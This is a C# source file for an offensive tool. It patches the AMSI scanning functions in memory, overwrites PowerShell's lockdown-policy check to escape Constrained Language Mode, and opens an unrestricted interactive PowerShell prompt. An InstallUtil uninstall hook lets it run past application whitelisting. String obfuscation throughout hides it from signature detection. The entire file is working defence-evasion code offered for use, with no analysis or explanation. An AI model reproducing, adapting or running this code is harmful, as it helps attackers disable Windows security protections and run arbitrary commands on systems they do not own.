using System;
using System.IO;
using System.Text;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System.Linq;
using System.Collections.Generic;

namespace altbypass
{
    class Program
    {
        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", SetLastError = true)] static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GetCurrentProcess();

        static int Bypass()
        {
            Char c1, c2, c3, c4, c5, c6, c7, c8, c9, c10;
            c1 = 'A';
            c2 = 's';
            c3 = 'c';
            c4 = 'n';
            c5 = 'l';
            c6 = 't';
            c7 = 'z';
            c8 = 'U';
            c9 = 'y';
            c10 = 'o';
            string[] filePaths = Directory.GetFiles(@"c:\wind" + c10 + "ws\\s" + c9 + "stem32", "a?s?.d*");
            string libname = (filePaths[0].Substring(filePaths[0].Length - 8));
            try
            {
                uint lpflOldProtect;
                var lib = LoadLibrary(libname);

                var baseaddr = GetProcAddress(lib, c1 + "m" + c2 + "i" + c8 + "a" + c3 + "I" + c4 + "i" + c6 + "ia" + c5 + "i" + c7 + "e");
                int buffsize = 1000;
                var randoffset = baseaddr - buffsize;
                IntPtr hProcess = GetCurrentProcess();
                byte[] addrBuf = new byte[buffsize];
                IntPtr nRead = IntPtr.Zero;
                ReadProcessMemory(hProcess, randoffset, addrBuf, addrBuf.Length, out nRead);
                byte[] asb = new byte[7] { 0x4c, 0x8b, 0xdc, 0x49, 0x89, 0x5b, 0x08 };
                Int32 asbrelloc = (PatternAt(addrBuf, asb)).First();
                var funcaddr = baseaddr - (buffsize - asbrelloc);
                VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
                Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);
                byte[] ass = new byte[7] { 0x48, 0x83, 0xec, 0x38, 0x45, 0x33, 0xdb };
                Int32 assrelloc = (PatternAt(addrBuf, ass)).First();
                funcaddr = baseaddr - (buffsize - assrelloc);
                VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
                Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                Console.WriteLine("Could not patch " + libname + "...");
            }

            return 0;
        }
        public static IEnumerable<int> PatternAt(byte[] source, byte[] pattern)
        {
            for (int i = 0; i < source.Length; i++)
            {
                if (source.Skip(i).Take(pattern.Length).SequenceEqual(pattern))
                {
                    yield return i;
                }
            }
        }

        private static void runCommand(PowerShell ps, string cmd)
        {
            string getError = "get-variable -value -name Error | Format-Table -Wrap -AutoSize";
            ps.AddScript(cmd);
            ps.AddCommand("Out-String");

            try
            {
                Collection<PSObject> results = ps.Invoke();
                Console.WriteLine(buildOutput(results).ToString().Trim());

                //check for errors
                ps.Commands.Clear();
                ps.AddScript(getError);
                ps.AddCommand("Out-String");
                results = ps.Invoke();
                StringBuilder stringBuilder = buildOutput(results);

                // if $Error holds a value
                if (!String.Equals(stringBuilder.ToString().Trim(), ""))
                {
                    Console.WriteLine(stringBuilder.ToString().Trim());

                    //clear error var
                    ps.Commands.Clear();
                    ps.AddScript("$error.Clear()");
                    ps.Invoke();
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
            ps.Commands.Clear();
        }

        private static StringBuilder buildOutput(Collection<PSObject> results)
        {
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }

            return stringBuilder;
        }

        public static void Main()
        {
            Bypass();

            Char a1, a2, a3, a4, a5;
            a1 = 'y';
            a2 = 'g';
            a3 = 'u';
            a4 = 'o';
            a5 = 't';
            var Automation = typeof(System.Management.Automation.Alignment).Assembly;
            var get_l_info = Automation.GetType("S" + a1 + "stem.Mana" + a2 + "ement.Au" + a5 + "oma" + a5 + "ion.Sec" + a3 + "rity.S" + a1 + "stemP" + a4 + "licy").GetMethod("GetS" + a1 + "stemL" + a4 + "ckdownP" + a4 + "licy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
            var get_l_handle = get_l_info.MethodHandle;
            uint lpflOldProtect;

            RuntimeHelpers.PrepareMethod(get_l_handle);
            var get_l_ptr = get_l_handle.GetFunctionPointer();

            VirtualProtect(get_l_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);

            var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };

            Marshal.Copy(new_instr, 0, get_l_ptr, 4);
            string cmd;

            //set a large readline input buffer
            const int BufferSize = 3000;
            Console.SetIn(new StreamReader(Console.OpenStandardInput(), Encoding.UTF8, false, BufferSize));

            Runspace rs = RunspaceFactory.CreateRunspace();
            PowerShell ps = PowerShell.Create();
            rs.Open();
            ps.Runspace = rs;

            while (true)
            {
                Console.Write("PS " + Directory.GetCurrentDirectory() + ">");
                cmd = Console.ReadLine();

                if (String.Equals(cmd, "exit"))
                    break;

                runCommand(ps, cmd);
            }
            rs.Close();
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);
            Program.Main();
        }
    }
}